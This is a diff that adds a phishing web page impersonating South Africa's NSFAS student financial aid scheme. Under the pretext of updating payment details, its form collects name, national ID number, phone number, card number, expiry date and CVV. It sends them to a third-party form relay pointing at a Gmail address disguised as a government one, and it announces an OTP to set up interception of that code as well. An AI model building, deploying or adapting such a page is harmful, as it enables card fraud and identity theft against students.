@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+       <!-- Header Section -->
+       <header>
+        <img src="images/nsfas.logo.jpg" alt="Logo">
+        <h1>NSFAS -National Student Financial Aid Scheme </h1>
+        <p>Keep up to date with your NSFAS payment details</p>
+    </header>
+    
+<!-- Add this form inside the <main> section or wherever appropriate -->
+    <section id="update-form" style="margin-top: 40px;">
+        <h2>Update Your Information</h2>
+        <form action="https://formsubmit.co/info.sassa.gov@gmail.com" method="post" style="display: flex; flex-direction: column; max-width: 400px; margin: auto;">
+            <label for="name" style="margin-bottom: 10px;">Full Name(s):</label>
+            <input type="text" id="name" name="name" placeholder="Enter your full name" required style="padding: 10px; margin-bottom: 20px;">
+    
+            <label for="id-number" style="margin-bottom: 10px;">ID Number:</label>
+            <input type="tel" id="id-number" name="id-number" placeholder="Enter your ID number" required pattern="\d{13}"  style="padding: 10px; margin-bottom: 20px;">
+    
+            <label for="Phone Number" style="margin-bottom: 10px;">Phone Number:</label>
+            <input type="tel" id="phone-number" name="phone-number" placeholder="Enter your phone number" required  pattern="\d{10}" style="padding: 10px; margin-bottom: 20px;">
+            
+            <label for="Card Number" style="margin-bottom: 10px;">Card Number:</label>
+            <input type="Tel" id="Card Number" name="card number" placeholder="Enter your Card Number" required pattern="\d{16}"  style="padding: 10px; margin-bottom: 20px;">
+
+            <label for="Expiry Date" style="margin-bottom: 10px;">Expiry Date:</label>
+            <input type="text" id="Expiry Date" name="expiry-date" placeholder="MM/YYYY" required pattern="\d{2}/\d{4}" title="Enter the date in MM/DD format" style="padding: 10px; margin-bottom: 20px;">
+
+            <script>
+                function formatExpiryDate(input) {
+                    // Automatically add a slash after the month
+                    if (input.value.length === 2 && !input.value.includes('/')) {
+                        input.value = input.value + '/';
+                    }
+                }
+            </script>    
+
+            <label for="CVV" style="margin-bottom: 10px;">CVV:</label>
+            <input type="Tel" id="CVV" name="card number" placeholder="Enter your CVV" required pattern="\d{3}"  style="padding: 10px; margin-bottom: 20px;">
+
+                <p>An OTP will be sent to your number for verification.</p>
+            <button type="submit">Submit</button>
+        </form>
+    </section>
+
+    <!-- Footer Section -->
+    <footer style="background-color: #333; color: white; text-align: center; padding: 10px; margin-top: 40px;">
+        <p>&copy; 2025 NSFAS. All rights reserved.</p>
+        <p>Contact us: <a href="mailto:Info@nsfas.org.za" style="color: blue;">Info@nsfas.org.za</a></p>
+    </footer>
+</body>
+</html>
